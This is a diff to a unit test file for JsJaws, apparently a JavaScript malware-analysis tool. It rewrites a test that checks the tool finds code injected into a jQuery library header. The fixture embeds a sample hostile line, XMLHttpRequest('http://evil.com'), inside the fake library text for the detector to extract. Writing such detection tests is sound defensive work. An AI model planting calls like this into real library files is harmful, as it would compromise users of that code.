@@ -281,8 +281,6 @@ class TestJsJaws:
         assert jsjaws_class_instance.boxjs_resources is None
         assert jsjaws_class_instance.boxjs_analysis_log is None
         assert jsjaws_class_instance.boxjs_snippets is None
-        assert jsjaws_class_instance.filtered_lib is None
-        assert jsjaws_class_instance.filtered_lib_path is None
         assert jsjaws_class_instance.cleaned_with_synchrony is None
         assert jsjaws_class_instance.cleaned_with_synchrony_path is None
         assert jsjaws_class_instance.stdout_limit is None
@@ -847,30 +845,14 @@ class TestJsJaws:
         evil_string = "XMLHttpRequest('http://evil.com');\n"
         fake_response_text = "/*!\n * jQuery JavaScript Library v1.11.3\n * http://jquery.com/\n *\n * Includes Sizzle.js\n * http://sizzlejs.com/\n *\n * Copyright 2005, 2014 jQuery Foundation, Inc. and other contributors\n * Released under the MIT license\n * http://jquery.org/license\n *\n * Date: 2015-04-28T16:19Z\n */"
         mocker.patch("jsjaws.get", return_value=dummy_get_response_class(fake_response_text))
-        file_contents = f"/*!\n * jQuery JavaScript Library v1.11.3\n * http://jquery.com/\n *\n * Includes Sizzle.js\n * http://sizzlejs.com/\n *\n * Copyright 2005, 2014 jQuery Foundation, Inc. and other contributors\n * Released under the MIT license\n{evil_string} * http://jquery.org/license\n *\n * Date: 2015-04-28T16:19Z\n */"
-        jsjaws_class_instance.filtered_lib = "filtered_lib.js"
-        jsjaws_class_instance.filtered_lib_path = path.join("/tmp", jsjaws_class_instance.filtered_lib)
+        file_contents = f"/*!\n * jQuery JavaScript Library v1.11.3\n * http://jquery.com/\n *\n * Includes Sizzle.js\n * http://sizzlejs.com/\n *\n * Copyright 2005, 2014 jQuery Foundation, Inc. and other contributors\n * Released under the MIT license\n{evil_string} * http://jquery.org/license\n *\n * Date: 2015-04-28T16:19Z\n */".encode()
         jsjaws_class_instance.artifact_list = []
-        res = Result()
-        correct_res_sec = ResultSection(
-            "Embedded code was found in common library",
-            body=f"View extracted file {jsjaws_class_instance.filtered_lib} for details.",
-        )
-        correct_res_sec.set_heuristic(4)
-        jsjaws_class_instance._extract_filtered_code(res, file_contents)
+        file_path, new_file_contents, lib_path = jsjaws_class_instance._extract_filtered_code(file_contents)
 
-        assert path.exists(jsjaws_class_instance.filtered_lib_path)
-        with open(jsjaws_class_instance.filtered_lib_path, "r") as f:
-            val = f.read()
-            assert val == evil_string
-        assert jsjaws_class_instance.artifact_list[0] == {
-            "name": jsjaws_class_instance.filtered_lib,
-            "path": jsjaws_class_instance.filtered_lib_path,
-            "description": "JavaScript embedded within common library",
-            "to_be_extracted": True,
-        }
-        assert check_section_equality(res.sections[0], correct_res_sec)
-        remove(jsjaws_class_instance.filtered_lib_path)
+        assert path.exists(file_path)
+        assert new_file_contents == evil_string.encode()
+        assert lib_path == "https://code.jquery.com/jquery-1.11.3.js"
+        remove(file_path)
 
     @staticmethod
     @pytest.mark.parametrize("line_1, line_2, expected_result", [
